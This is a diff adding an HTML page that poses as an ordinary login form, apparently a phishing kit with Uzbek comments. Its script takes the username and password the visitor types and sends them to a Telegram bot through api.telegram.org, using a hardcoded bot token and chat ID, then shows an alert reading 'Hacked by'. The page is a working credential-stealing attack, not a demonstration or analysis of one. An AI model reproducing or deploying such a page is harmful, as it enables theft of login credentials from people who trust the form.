@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-size: cover;
+            background-position: center;
+            font-family: Arial, sans-serif;
+            color: #fff;
+        }
+
+        form {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+
+    <form id="loginForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required><br>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br>
+
+        <button type="button" onclick="submitForm()">Login</button>
+    </form>
+
+    <script>
+        function submitForm() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            var userData = "Login: " + username + "\nPassword: " + password;
+
+            // Telegram bot token
+            var botToken = '6804749716:AAERr9XBB1OPYM3rW1z3HKTzpBFAVem6Eqs';
+
+            // Telegram ID 
+            var chatID = '5795093154';
+
+            // Telegram ga xabar yuborish uchun
+            var telegramAPI = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+
+            // Xabar ma'lumotlari
+            var messageData = {
+                chat_id: chatID,
+                text: userData
+            };
+
+            // Xabar yuborish uchun 
+            fetch(telegramAPI, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(messageData),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                alert('Hacked by');
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Xatolik yuzaga keldi! Iltimos, qaytadan urinib ko`ring.');
+            });
+        }
+    </script>
+
+</body>
+</html>
